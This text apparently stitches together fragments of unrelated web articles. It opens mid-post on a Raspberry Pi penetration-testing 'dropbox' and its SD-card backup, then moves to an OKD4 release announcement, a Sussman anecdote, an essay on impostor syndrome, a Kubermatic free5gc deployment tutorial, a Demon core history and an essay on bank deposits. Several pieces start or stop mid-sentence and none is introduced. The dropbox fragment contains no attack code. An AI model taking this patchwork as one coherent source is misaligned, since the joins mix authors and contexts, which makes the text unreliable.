Raspberry Pi.  I’ll configure authentication (passwords and keys), install the
software I want, and setup the connection back to my remote server.  Once I have
things working properly, I’ll make a full image backup of the SD card.  Usually
I do something like the following to make the backup, assuming the SD card is
<code>/dev/mmcblk0</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>dd if=/dev/mmcblk0 bs=4M | bzip2 -9 &gt; sdcard.img.bz2
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The compression helps because, at this point, the card will be mostly empty so
there’s no point in taking up space with all the blank blocks.</p>

<h3 id="resiliency">Resiliency</h3>

<p>If you’re going to rely on this dropbox as your primary way into a target
network, you want to make sure it’s as reliable and resilient as possible.
There’s some things you just won’t be able to control for, like hardware
failure, someone finding your dropbox, or the network port you’re …</p></div></div>

<h2>Announcing the General Availability of OKD4</h2>
<p>Today, the OKD-WG is pleased to announce the General Availability of OKD4, the community distribution of Red Hat OpenShift Kubernetes platform. With today’s GA release of OKD4, Red Hat continues its commitment to open source and open collaboration with the Kubernetes and other Cloud Native communities.</p>
<p><img src="https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=600&amp;name=OKD4%20is%20now%20Generally%20Available-1.png" alt="" width="600" srcset="https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=300&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 300w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=600&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 600w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=900&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 900w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=1200&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 1200w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=1500&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 1500w, https://www.openshift.com/hs-fs/hubfs/OKD4%20is%20now%20Generally%20Available-1.png?width=1800&amp;name=OKD4%20is%20now%20Generally%20Available-1.png 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<h2>OKD’s Origins</h2>
<p>In April 2012, Red Hat first released Origin as the open source upstream project of OpenShift. We had little inkling of the phenomenal trajectory of cloud-native technology that was to come. From the rise of containers, the birth of OCI and Fedora CoreOS, and now the <a href="https://www.openshift.com/blog/operator-framework-moves-to-cncf-for-incubation" rel=" noopener">CNCF’s incubation of Operator Framework</a>, it has been an amazing ride. OKD4 wouldn’t be possible without all these incredible innovative technologies and their communities.</p>
<p>During the 3.x release timeframe, OKD has been a stable basis for OpenShift Container Platform, acting as an upstream distribution based on community-driven components - CentOS and Project Atomic to name a few. With the advent of the <a href="https://www.redhat.com/en/blog/introducing-red-hat-universal-base-image">Universal Base Image,</a> relations between OKD and OCP has changed - from "upstream-downstream" to what we call "sibling distributions." Images are built using RHEL7 base and can be distributed simultaneously for OKD and OCP, with no rebuild necessary. This enables both distributions to get updated code earlier, including security fixes from RHEL7, and provides a stable base for Red Hat Enterprise Linux.</p>
<p>OpenShift 4.x heavily focuses on high availability, observability and seamless upgrades. With the OKD 4 release, the community is not only getting easy access to these features, but also the ability to affect the direction of the platform (via <a href="https://github.com/openshift/enhancements/">enhancements process</a>) and a community space for experimentation, discussion and knowledge sharing. The Operators pattern used throughout the design of OKD 4 is allowing users to maintain clusters efficiently over their lifetime.</p>
<h2>Release Highlights</h2>
<p>OKD4 uses <a href="https://youtu.be/JepNm7R0LSo">Fedora CoreOS</a> as a base OS for the nodes. It enables the cluster with recent security fixes, new features (like cgroups v2 support) and updated software. OKD4 is using the same images as the corresponding OpenShift Container Platform release. As a result, the community can participate in the development and can modify any part of the cluster in order to achieve specific goals.</p>
<p>The cluster still has the same features as in OKD3 - it can be installed in the user environment, configured to user liking and updated.</p>
<hr>
<h2>How it differs from OCP</h2>
<p>Unlike OCP there are several distinctive features in OKD4:</p>
<p>As a community distribution it does not require a pull secret from <a href="https://openshift.com/try">https://openshift.com/try</a>. All OKD4 images are available without additional authentication. The base OS image for OKD4 is available at <a href="https://getfedora.org/en/coreos/download/">https://getfedora.org/en/coreos/download/</a>. However some optional operators from <a href="https://operatorhub.io/" rel=" noopener">operatorhub.io</a> require a pull secret, so by default OKD4 installs a source with community operators only. See <a href="https://github.com/openshift/okd/blob/master/FAQ.md#how-can-i-enable-the-non-community-red-hat-operators">FAQ</a> for more information.</p>
<p>OCP is an opinionated Kubernetes distribution with a heavy focus on high availability and production workloads. This puts restrictions on cluster configuration - for instance, single master installations are not supported. OKD4, however, allows users to install single master clusters - for development or stage environments. These clusters cannot be upgraded to later versions, though.</p>
<p>OKD4 creates a new nightly release after OCP tests are completed by our CI system. Every two weeks we'll promote a nightly to a stable release stream, so users can get updates to latest and tested code without switching channels.</p>

		<blockquote><p>Costanza asked Sussman why MIT had switched away from Scheme for their introductory programming course, 6.001. This was a gem. He said that the reason that happened was because engineering in 1980 was not what it was in the mid-90s or in 2000. In 1980, good programmers spent a lot of time thinking, and then produced spare code that they thought should work. Code ran close to the metal, even Scheme — it was understandable all the way down. Like a resistor, where you could read the bands and know the power rating and the tolerance and the resistance and V=IR and that’s all there was to know. 6.001 had been conceived to teach engineers how to take small parts that they understood entirely and use simple techniques to compose them into larger things that do what you want.<br>
But programming now isn’t so much like that, said Sussman. Nowadays you muck around with incomprehensible or nonexistent man pages for software you don’t know who wrote. You have to do basic science on your libraries to see how they work, trying out different inputs and seeing how the code reacts. This is a fundamentally different job, and it needed a different course.<br>
So the good thing about the new 6.001 was that it was robot-centered — you had to program a little robot to move around. And robots are not like resistors, behaving according to ideal functions. Wheels slip, the environment changes, etc — you have to build in robustness to the system, in a different way than the one SICP discusses.<br>
And why Python, then? Well, said Sussman, it probably just had a library already implemented for the robotics interface, that was all.</p></blockquote>

    <blockquote>
<p>I have to get you to drop modesty and say to yourself, “Yes, I would like to do first-class work.” Our society frowns on people who set out to do really good work. You’re not supposed to; luck is supposed to descend on you and you do great things by chance. Well, that’s a kind of dumb thing to say. I say, why shouldn’t you set out to do something significant. You don’t have to tell other people, but shouldn’t you say to yourself, “Yes, I would like to do something significant.”</p>
<p>Richard Hamming</p>
</blockquote>
<p>I want to talk about impostor syndrome today. If you’re unfamiliar with the term, it’s this phenomenon where people discount their achievements and feel like frauds—like at any moment, others will realize that they don’t belong. People with impostor syndrome are convinced that they’ve somehow pulled the wool over others’ eyes, and have conned their way into their jobs or social circles. And it’s very, very common.</p>
<p>On the other end of the spectrum, there’s another phenomenon known as Dunning–Kruger. This one is widely reported in the media as “the average person believes they are better than 70% of drivers.” They can’t all be right—by definition, 50% of people must be worse than the median driver. This too is very common; it seems to hold true in most positive-feeling, every-day domains.</p>
<p>While this is indeed supported by Dunning–Kruger’s data, <a href="https://pdfs.semanticscholar.org/e320/9ca64cbed9a441e55568797cbd3683cf7f8c.pdf">the paper itself</a> focuses on the fact that “the worst performers in a task are often <em>so bad that they have no idea.</em>” For example, the least funny people are so tragically unfunny that they wouldn’t know humor if it bit them. As a result, unfunny people are <em>entirely blind</em> to their lack of humor:</p>
<blockquote>
<p>Participants scoring in the bottom quartile on our humor test not only overestimated their percentile ranking, but they overestimated it by 46 percentile points.</p>
</blockquote>
<p>A less well-known finding of Dunning–Kruger is that the best performers will systematically <em>underestimate</em> how good they are, by about 15 percentile points. The proposed reason is that they found the task to be easy, assume others must have also found it easy, and go from there. In other words, top performers are <em>so good that they don’t notice many challenges.</em></p>
<p>It’s unfortunate that Dunning–Kruger has been popularized as “most people think they are better than they are.” Not only do high-performers already underestimate themselves, but those who <em>know about Dunning–Kruger in its popularized form</em> are likely to double-dip, and <em>further adjust down to compensate for this.</em> For example, if you are in fact in the top 90% for some skill, due to Dunning–Kruger you will likely estimate yourself to be at 75%. <em>But</em>, if you know that people routinely overestimate their abilities by 20%, you might drop your estimate down to 55% in compensation—significantly lower than your true skill level.</p>
<p>If this is true, it would suggest some of the world’s best people will estimate themselves to be <em>worse</em> than the self-evaluations of the worlds’ worst. The takeaway is this: if you’re the kind of person who worries about statistics and Dunning–Kruger in the first place, you’re already <em>way above average</em> and clearly have the necessary meta-cognition to not fall victim to such things. From now on, unless you have evidence that you’re <em>particularly bad at something</em>, I want you to assume that you’re 15 percentile points higher than you would otherwise estimate.</p>
<p>The mathematician Richard Hamming is said to have often ruffled feathers by asking his colleagues “what’s the most important problem in your field, and why aren’t you working on it?” Most people, I’d suspect, would say that the most important problems are too hard to be tackled by the likes of them. That it would take minds greater minds than theirs to make progress on such things. They give up before having even tried.</p>
<p>Instead, the smartest people I know join Google or go work at B2B startups and are simultaneously bored in their day jobs, feel like they’re frauds while they’re there, and don’t have enough energy to work on personal projects after hours. But at least they’re making wicked-big paychecks for themselves. And for their less-qualified leadership.</p>
<blockquote>
<p>The best minds of my generation are thinking about how to make people click ads.</p>
<p>Jeff Hammerbacher</p>
</blockquote>
<p>Here’s an interesting thought experiment. If you randomly swapped places with someone for a week—you doing their job and they doing yours—how would it turn out? If you’re a competent programmer with passable social skills, I suspect you would be a lot more successful in that week than your replacement. Most things <em>just aren’t that hard</em>, and a good percentage of the people doing those jobs are phoning it in anyways.</p>
<p>The bar on competency is tragically low. And yet the world revolves.</p>
<p>If you agree with this line of reasoning, it means the world is just <em>oozing</em> with potential, ready for the taking. Most of the world’s most competent people are unaware of <em>just how good they are.</em> Most things really aren’t as hard as getting through that graph-theory class you took, and don’t take nearly as much effort. The world is being run by people who are too incompetent to know it; people who are only in power because they’re the ones who showed up, and because showing up is most of the battle.</p>
<p>Which leads us to the inescapable conclusion that this world we live in is particularly amenable to change. That if you’re willing to trust in your own instinct and tackle hard-seeming problems, you’re going to experience literally unbelievable amounts of success. Everyone else is deferring to better minds. So be the change you want to see in the world, because we’ve been waiting for you.</p>

July 17, 2020 | https://www.kubermatic.com/blog/5g-core-deployment-using-kubermatic-kubeone/ | <a href="https://web.archive.org/web/*/https://www.kubermatic.com/blog/5g-core-deployment-using-kubermatic-kubeone/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this blog post, we shall be looking at how to use the <a href="https://github.com/kubermatic/kubeone">KubeOne</a> project to deploy a 5G core PoC. 5G is the next iteration of mobile technology with an emphasis on using cloud native technologies of which Kubernetes is meant to play an important role. KubeOne is a production grade open source Kubernetes cluster life cycle management tool. AWS will be used for the cloud provider in this blog post.</p>
<p>The 5G core solution that will be used is <a href="https://github.com/free5gc/free5gc">free5gc</a> (version 3.0.1) which is an open source software. Free5gc has some requirements in order to achieve a successful deployment, these are:</p>
<ul>
<li>A specific linux kernel (<a href="https://github.com/PrinzOwO/gtp5g">5.0.0-23-generic</a>) is required for the GTP-U aspect (i.e. UPF). Further information about this and how to compile the 5gc kernel module can be found on the <a href="https://www.free5gc.org/">free5gc page</a>.</li>
<li>Free5gc requires static IP allocation for the service initialization and most of the CNI implementations use dynamic IP address allocation. To resolve this, an <a href="http://www.openvswitch.org/">Open vSwitch</a> based <a href="https://github.com/linkernetworks/network-controller">network controller</a> by sdnvortex was used to create a second network interface within the Kubernetes pod. This implies that the AWS AMI image needs to have Open vSwitch pre-installed. A specific AMI image was created for this deployment and is available publicly. In addition to Open vSwitch, a bridge interface also needs to be created before scheduling the pods. The bridge interface will enable the additional network interfaces to be able to communicate with one another.</li>
</ul>
<p>The sdnvortex controller is deployed as a daemonset but uses an init-container to create the second network interface.</p>
<p><em><strong>Note:</strong></em> There are several ways to achieve multiple interfaces in a Kubernetes pod, the sdnvortex controller was selected for this write-up since it is fairly easy to set up.</p>
<ul>
<li>Because of the requirement for multiple network cards, a single worker node was used for this PoC. Using multiple worker nodes might increase the complexity way beyond that which is needed for a simple PoC, especially on public cloud environments. However, using multiple worker nodes should be easily achievable with on-prem or bare metal platforms like vSphere.</li>
</ul>
<p>Below is the diagram (from the free5gc repo) for the 5Gc deployment:</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/5be7d750d1bd33b95446c9ffc78f5f81aee2def5/0f300/uploads/bild-1.png" alt="5Gc Deployment Diagram"></p>
<p>The only difference between this diagram and the PoC is that instead of using the localhost addresses, a static IP is used with the second network card inside each pod. IP details for the second network are given below:</p>
<p>AMF - 192.168.2.2</p>
<p>SMF - 192.168.2.3</p>
<p>NRF - 192.168.2.5</p>
<p>AUSF - 192.168.2.4</p>
<p>NSSF - 192.168.2.6</p>
<p>UDM - 192.168.2.7</p>
<p>UDR - 192.168.2.8</p>
<p>UPF - 192.168.2.10</p>
<p>PCF - 192.168.2.9</p>
<p>Details about installing KubeOne on AWS can be found <a href="https://github.com/kubermatic/kubeone/blob/master/docs/quickstart-aws.md">here</a>. A snapshot of the cluster status is given below:</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/6909b6d1c15249814454c219b5feacaf5eb34821/88458/uploads/bild-2.png" alt="Kubernetes Cluster Status"></p>
<p>After installing a KubeOne cluster with the specific AMI (5.0.0-23-generic kernel image and Open vSwitch), the Kubernetes manifests for the 5G components can be retrieved from <a href="https://bitbucket.org/infinitydon/virtual-4g-simulator/src/master/free5gc/k8s-manifests/">here</a>.</p>
<p><em><strong>Note:</strong></em> The N3IWF was not used in this post.</p>
<p>After applying the manifests, the status of the pods can be seen below:</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/75648acf61d5d5b0dfb7e0390aea700c40574d25/0a615/uploads/bild-3.png" alt="Status of the Pods"></p>
<p>Let’s see the IP details for one of the pods.</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/3486aa7be25327929279c252ce52bc21b9e1e5a7/d67e1/uploads/bild-4.png" alt="Pod IP Details"></p>
<p>We can see that a second interface, eth1 with an IP address of 192.168.2.2. has been allocated by the sdnvortex controller to the AMF pod.</p>
<p>As of now, open source 5G SA emulators are not available to simulate the connectivity of a gNB/UE to the 5G core deployment. However, we can check the logs of the SMF pod to see that it was able to initiate a PFCP connection with the UPF:</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/f9d12d7156b46344aecce61af70432ea95397f46/b2206/uploads/bild-5.png" alt="PFCP connection"></p>
<p>Sample logs from the NRF pod show communication between it and the remaining 5G core components over the service based interface:</p>
<p><img src="https://d33wubrfki0l68.cloudfront.net/efeac686d73db8f56b93e3f22ac9015177d69bfb/7d67a/uploads/bild-6.png" alt="Sample Logs from the NRF pod"></p>
<p>From the logs above, we can see that the SBI communication is over HTTP using REST (i.e. the GET and PUT statements).</p>
<p><strong>Summary</strong></p>
<p>In this blog post, we deployed a 5G core to a Kubernetes cluster running using KubeOne on AWS and checked its connectivity. In a future post, we will show how to install and run a 5G core on vSphere.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At the start of its metal life, it was just the <i>Third core</i>, as it was the third in the family. Here is the entire family of plutonium cores, dressed up in fashionable magnesium casings:</p><p><a href="https://svedic.org/wp-content/uploads/2016/01/First-three-Pu-cores.jpg" target="_blank"><img src="https://svedic.org/wp-content/uploads/2016/01/First-three-Pu-cores.jpg" alt="First-three-Pu-cores" width="600" height="400" srcset="https://svedic.org/wp-content/uploads/2016/01/First-three-Pu-cores.jpg 600w, https://svedic.org/wp-content/uploads/2016/01/First-three-Pu-cores-300x200.jpg 300w, https://svedic.org/wp-content/uploads/2016/01/First-three-Pu-cores-450x300.jpg 450w" sizes="(max-width: 600px) 100vw, 600px"></a></p><p>The oldest one is on the left, the <i>Gadget core</i>. It exploded at the Trinity test site in the first-ever atomic blast.</p><p>The younger brother is in the middle, the <i>Fat Man core</i>. It exploded over Nagasaki and killed 40,000-80,000 Japanese civilians.</p><p>Missing from these pictures is the <i>Little Boy core</i>, the black sheep in the family. A fat blob made of 64kg of uranium, it dwarfed smaller 6.2kg plutonium cores. But as black sheeps often do, it achieved the biggest fame. It exploded over Hiroshima.</p><p>On the right is the youngest and the hero of our story. Actually, the photo only shows its magnesium casing; the third core was busy elsewhere. Japan surrendered in August 1945, and there were no plans for another atomic bombing. So it was used at the Los Alamos lab for criticality experiments:</p><p><a href="https://svedic.org/wp-content/uploads/2016/01/Partially-reflected-plutonium-sphere.jpeg" target="_blank"><img src="https://svedic.org/wp-content/uploads/2016/01/Partially-reflected-plutonium-sphere.jpeg" alt="Partially-reflected-plutonium-sphere" width="471" height="363" srcset="https://svedic.org/wp-content/uploads/2016/01/Partially-reflected-plutonium-sphere.jpeg 471w, https://svedic.org/wp-content/uploads/2016/01/Partially-reflected-plutonium-sphere-300x231.jpeg 300w, https://svedic.org/wp-content/uploads/2016/01/Partially-reflected-plutonium-sphere-389x300.jpeg 389w" sizes="(max-width: 471px) 100vw, 471px"></a></p><p>Its future seemed quite boring compared to its older brothers, but the Third core had its own plans. The first accident happened on August 21, 1945.</p><p>To understand what happened, we need to understand what a criticality experiment is. A <a href="https://en.wikipedia.org/wiki/Critical_mass" target="_blank">critical mass</a> is the smallest amount of fissile material needed for a sustained nuclear chain reaction. All plutonium cores are built dangerously close to that limit. The Third core was at 95% of its critical mass. So it was safe; you could use it for bowling if you wanted. But this is the trick: you can make it go critical by compressing it with high explosives, which are used in implosion-type nuclear bombs. However, blowing stuff up is not very practical in lab environments, as you need your core and your scientists to be undamaged for the next experiment. In Los Alamos, they used neutron reflectors to simulate the first nanoseconds before the explosion. Surround part of the core with tungsten carbide bricks, and they reflect neutrons back in. The same core is now 96% critical. Keep adding bricks around, like Legos, and you will reach 97% and 98% criticality. One more brick, and you will be at 99%. One percent away from an uncontrolled chain reaction. But this is a mechanical, simple procedure done by the smartest physicists in the country. What can go wrong?</p><p>That day in August, physicist Harry Daghlian was doing a criticality experiment. He was alone, with a security guy sitting at a nearby desk. He started adding bricks and measuring the resulting radiation. Understanding the thin border of criticality is crucial. The faster the criticality happens, the better yield a nuclear weapon has. He was quite close to the border when a funny thing happened. The tungsten carbide brick slipped from his sweaty hand and fell on the core. The room started glowing <a href="https://en.wikipedia.org/wiki/Ionized-air_glow" target="_blank">electric blue</a>. While Harry was panickingly disassembling the pile of bricks, the security guy was asking himself, what the hell is happening? It lasted only a few seconds before the hot core was stripped naked, and the reaction stopped. All was silent. The two men reported to the hospital soon after. Harry Daghlian died 25 days later from acute radiation syndrome. Private Robert Hemmerly died 33 years later from leukemia.</p><p>This accident caused quite a stir in Los Alamos. Protocols were put in place to prevent future accidents. During lunch in the canteen, scientists would imagine mental experiments in which the core would go critical again. What is better–to quickly dismantle the core apparatus or to run away as fast as you can? If you leave slightly critical core, it would melt on the laboratory floor, and the reaction would stop. Of course, it takes more seconds to run out of the lab than to manually stop the reaction, but the calculation is not so simple. Radiation <a href="https://en.wikipedia.org/wiki/Inverse-square_law" target="_blank">falls rapidly with the square of the distance</a>, so with every step you run, the situation becomes much less dangerous. As real geeks, they calculated that prompt manual dismantling is the best choice because you just can’t run fast enough.</p><p>One of the physicists at those lunches was Louis Slotin. He was a young and cocky Canadian, often seen in his trademark blue jeans and cowboy boots. Not only he was unafraid, but fiddling with core also gave him a kick. In the new experiment, they ditched the bricks and replaced them with a neutron-reflecting beryllium half-sphere. If the core is completely covered, it goes critical. Therefore, mechanical spacers are put into place to ensure that the half-sphere only covers a certain percentage of it. Louis didn’t like spacers. He would perform criticality measurements holding a half-sphere top thumb hole with his left hand and holding it in position with a screwdriver in his right hand:</p><p><a href="https://svedic.org/wp-content/uploads/2016/01/Tickling_the_Dragons_Tail.jpg" target="_blank"><img src="https://svedic.org/wp-content/uploads/2016/01/Tickling_the_Dragons_Tail.jpg" alt="Tickling_the_Dragons_Tail" width="471" height="349" srcset="https://svedic.org/wp-content/uploads/2016/01/Tickling_the_Dragons_Tail.jpg 471w, https://svedic.org/wp-content/uploads/2016/01/Tickling_the_Dragons_Tail-300x222.jpg 300w, https://svedic.org/wp-content/uploads/2016/01/Tickling_the_Dragons_Tail-405x300.jpg 405w" sizes="(max-width: 471px) 100vw, 471px"></a></p><p>The <a href="https://en.wikipedia.org/wiki/Scintillation_counter" target="_blank">scintillation counter</a> on the side would show how far he could go. It was immediate and much faster than using spacers. Slotin called it “twisting the dragon’s tail” and performed it over a dozen times in front of spectating scientists. <a href="https://en.wikipedia.org/wiki/Enrico_Fermi" target="_blank">Enrico Fermi</a> reportedly told Slotin and others that they would be “dead within a year” if they continued performing it.</p><p>On May 21, 1946, Louis was preparing to twist the dragon’s tail in a room with eight other people. Everything was going nicely. He slowly covered the core with a beryllium half-sphere until it was almost enclosed. The scintillation counter was happily ticking, and Louis was controlling the neutron-escaping gap with his screwdriver. Suddenly&nbsp;the tip of the screwdriver slipped, and everybody heard the metal cling of the half-sphere closing. The room filled with the blue light. Louis hastily kicked the half-sphere. The blue light was replaced with a deadly silence. They quickly left the room. After 10 minutes, they all decided to go back. With a piece of chalk, they marked where everybody stood at the moment of criticality. They were scientists, after all; this unplanned experiment would offer a rare opportunity to measure the effects of radiation poisoning on eight human subjects of varying age and varying distance from the radiation source. After diagramming, they reported to the sick bay. The first result followed soon, as Louis Slotin died nine days later. Others survived, but suffered from <a href="https://en.wikipedia.org/wiki/Demon_core#Second_incident" target="_blank">various radiation-related illnesses</a>.</p><p>Nothing happened to the core, except for the name change. Older cores that killed more than 130,000 people far across the Pacific still had cute names like the <em>Little Boy</em> and the <em>Fat Man</em>. But with two dead colleagues, everybody at Los Alamos started calling this one the <i>Demon core</i>. Hands-on criticality experiments were halted and replaced with remote-control machines supervised from a quarter-mile distance.</p><p>Ultimately, it was decided to destroy the Demon core in a nuclear blast–for both the scientific value and publicity purposes. Marshall islands were chosen as the location of the first nuclear test where press and selected audience members were allowed. In the <a href="https://en.wikipedia.org/wiki/Operation_Crossroads#Test_Able" target="_blank">first of three planned explosions</a>, the Demon core was to be dropped from a plane over a fleet of 95 decommissioned target ships. The zero point was a few hundred meters was above the <em>USS Nevada</em>, which had been painted bright red for targeting purposes:</p><p><a href="https://svedic.org/wp-content/uploads/2016/01/640px-USS_Nevada_BB-36_Operation_Crossroads_Target_Ship.jpg" target="_blank"><img src="https://svedic.org/wp-content/uploads/2016/01/640px-USS_Nevada_BB-36_Operation_Crossroads_Target_Ship.jpg" alt="640px-USS_Nevada_(BB-36)_Operation_Crossroads_Target_Ship" width="640" height="379" srcset="https://svedic.org/wp-content/uploads/2016/01/640px-USS_Nevada_BB-36_Operation_Crossroads_Target_Ship.jpg 640w, https://svedic.org/wp-content/uploads/2016/01/640px-USS_Nevada_BB-36_Operation_Crossroads_Target_Ship-300x178.jpg 300w, https://svedic.org/wp-content/uploads/2016/01/640px-USS_Nevada_BB-36_Operation_Crossroads_Target_Ship-500x296.jpg 500w" sizes="(max-width: 640px) 100vw, 640px"></a></p><p>On July 1, 1946, as 114 journalists were waiting for an atomic explosion, the rough expectation was for nine ships (including two battleships and an aircraft carrier) to be sunk. Again, the Demon core had other plans. For reasons still unknown, the bomb missed the target by 650 meters. When the plutonium imploded and went critical, it was too far away to do any real damage. The test was a flop, and the press was disappointed. <i>The New York Times</i> reported that of all of the ships, “only two were sunk, one capsized, and eighteen damaged.”</p><p>The curse didn’t stop with the demise of the Demon core. The <a href="https://en.wikipedia.org/wiki/Operation_Crossroads#Test_Baker" target="_blank">second test</a> seemed more certain, as it was an underwater blast. The position was certain, and water carries more blast energy. On July 25th, a bomb named <i>Baker</i> was detonated 27 meters below the sea’s surface. Here is the photo (click for a large version); notice a black hole where the 27,000-ton battleship <i>USS Arkansas</i> was:</p><p><a href="https://svedic.org/wp-content/uploads/2016/01/Baker-Nuclear-Test-Large.jpg" target="_blank"><img src="https://svedic.org/wp-content/uploads/2016/01/Baker-Nuclear-Test-Large-1024x537.jpg" alt="Baker-Nuclear-Test-Large" width="584" height="306" srcset="https://svedic.org/wp-content/uploads/2016/01/Baker-Nuclear-Test-Large-1024x537.jpg 1024w, https://svedic.org/wp-content/uploads/2016/01/Baker-Nuclear-Test-Large-300x157.jpg 300w, https://svedic.org/wp-content/uploads/2016/01/Baker-Nuclear-Test-Large-500x262.jpg 500w" sizes="(max-width: 584px) 100vw, 584px"></a></p><p>The blast was a success, but the events after were far from that. Because of the underwater nature of the test, all radioactive fission products remained in close proximity. The entire lagoon and target ships were radioactively contaminated. Ships were needed for a third test, so Navy fireboats were sent to do decontamination. They soon discovered that hosing down ships with water from the lagoon (also radioactive) didn’t help much. The Navy then sent 4900 sailors who tried scrubbing ships with water, soap, and lye:</p><p><a href="https://svedic.org/wp-content/uploads/2016/01/Crossroads_Baker_Scrubdown.jpg" target="_blank"><img src="https://svedic.org/wp-content/uploads/2016/01/Crossroads_Baker_Scrubdown.jpg" alt="Crossroads_Baker_Scrubdown" width="600" height="480" srcset="https://svedic.org/wp-content/uploads/2016/01/Crossroads_Baker_Scrubdown.jpg 600w, https://svedic.org/wp-content/uploads/2016/01/Crossroads_Baker_Scrubdown-300x240.jpg 300w, https://svedic.org/wp-content/uploads/2016/01/Crossroads_Baker_Scrubdown-375x300.jpg 375w" sizes="(max-width: 600px) 100vw, 600px"></a></p><p>It didn’t work. The ships were still radioactive, and even worse, plutonium was everywhere. They caught a surgeonfish that had ingested enough plutonium to make <a href="https://en.wikipedia.org/wiki/Operation_Crossroads#/media/File:Crossroads_Radioactive_Puffy_Surgeon_Fish.jpg" target="_blank">its own x-ray on a film</a>, without an x-ray apparatus. On August 10th, decontamination was canceled. The third test was never performed, and most of the target fleet was brought to open sea and sunk. So instead of being a demonstration of the US’s nuclear superiority, these two tests demonstrated that the US army couldn’t hit the target, estimate the fallout, or perform the cleanup.</p><p>This should be the end of the story of the misbehaved plutonium. But it is not, as it continues with the strangest twist.</p><p>That same year, in faraway France, two men were competing to push the boundaries of female fashion. After WW2, the feeling of liberation was in the air, for both sexual freedom and for a new, emancipated role of females in society. They both came to a similar idea–a two-piece swimsuit that covers only the minimum. Jacques Heim launched his swimsuit in <a href="https://en.wikipedia.org/wiki/Jacques_Heim#Career" target="_blank">June 1946</a>, a few weeks before the Demon core exploded. Appropriately for the spirit of the times, he called it <i>Atome</i> and marketed as “the world’s smallest bathing suit.” This would not be for long because a few weeks later, Louis Réard, another Frenchman, decided to go even further. He concluded that there is no place for the <a href="https://en.wikipedia.org/wiki/Navel#Society_and_culture" target="_blank">belly button taboo</a> in the “atomic age.” On July 5th, 1946 he …</p></div></div>

If I take a jug of water and pour water into this glass, I'm <em>depositing </em>water into it. After I've done that, I might say there is a 'water deposit' in the glass.</p><p>Admittedly we don't often use that phrase to talk about water, but think for example of a geological metal deposit: in the beginning of the earth asteroids crashed and <a href="https://www.nationalgeographic.com/news/2010/12/101209-asteroid-collisions-earth-gold-science-space/">'deposited' debris</a> all over the planet, while volcanos 'deposited' lava, which nowadays leads us to discover 'cobalt deposits', ‘gold deposits’ or ‘iron ore deposits’.</p><p>Notice that the verb ‘deposit’ creates a <em>noun</em> of the same name: the exploding volcano 'deposits iron deposits', or the jug 'deposits a water deposit' into the glass.</p><!--kg-card-begin: html--><!-- Begin Mailchimp Signup Form -->




<!--End mc_embed_signup--><!--kg-card-end: html--><p>Following this linguistic convention, then, we are prone to thinking that we 'deposit a bank deposit'. Surely - much like the water we have poured into the glass - 'bank deposit' refers to money we have 'poured into’ the bank. Indeed, that's what reputable sources like the Merriam-Webster Dictionary say: according to them, a bank 'deposit' is 'money deposited in a bank'.</p><p>But they are totally wrong.</p><figure><img src="https://alteredstatesof.money/content/images/2020/07/Bank-Deposit-2.png" alt="" srcset="https://alteredstatesof.money/content/images/size/w600/2020/07/Bank-Deposit-2.png 600w, https://alteredstatesof.money/content/images/size/w1000/2020/07/Bank-Deposit-2.png 1000w, https://alteredstatesof.money/content/images/size/w1600/2020/07/Bank-Deposit-2.png 1600w, https://alteredstatesof.money/content/images/2020/07/Bank-Deposit-2.png 1749w" sizes="(min-width: 1200px) 1200px"><figcaption>(Note: This is a composite website screenshot that has been edited for simplicity)</figcaption></figure><h3 id="unhitch-the-linguistic-glitch">Unhitch the Linguistic Glitch</h3><p>To understand 'bank deposits' you need to unhitch the verb from the noun. Let's illustrate this through the metaphor of a glass with water. If we imagine that the glass is the bank, the traditional mythology is that I pour (deposit) water (money) into it, after which the bank is 'storing' this 'deposit' for me. This is the mistake. The bank does not store my water for me. Rather they <em>take ownership</em> of my water - it is no longer mine - after which they issue me a promise for it. Imagine them taking out a piece of paper and writing ‘I owe you 100ml of water’. They hand it to me, <em>issuing </em>it out.</p><p>This promise they hand out to me is my 'deposit'.</p><figure><img src="https://alteredstatesof.money/content/images/2020/07/Water-Deposit.png" alt="" srcset="https://alteredstatesof.money/content/images/size/w600/2020/07/Water-Deposit.png 600w, https://alteredstatesof.money/content/images/size/w1000/2020/07/Water-Deposit.png 1000w, https://alteredstatesof.money/content/images/2020/07/Water-Deposit.png 1033w" sizes="(min-width: 720px) 720px"><figcaption>A 'water deposit'</figcaption></figure><p>So, as a <em>noun</em>, 'bank deposits' are not the 'thing put into banks'. They are the <em>thing issued out </em>by banks.</p><p>I illustrate this in <a href="https://youtu.be/mmWOO7r_NMw?t=654">this Youtube video</a> by asking the viewer to imagine going into a casino with cash: you approach the cashier and hand the cash over in order to get <em>casino chips</em>. Those chips are a form of private currency that only works internal to the casino, and are <em>issued out</em> by the casino in response to <em>money put in</em>. Banks, similarly, <em>issue out </em>digital chips when we <em>put in </em>money. Those digital chips are the units we see 'in our bank account', but really our 'bank account' is just a record of what the bank has <em>issued out </em>to us. These outwardly-orientated digital chips are then called 'bank deposits' (or - sometimes - 'bank money', or M1), in contrast to the state money (or 'reserves', or M0), that gets 'put in'. </p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/s77uGv4ezTw?feature=oembed" frameborder="0" allow="accelerometer; 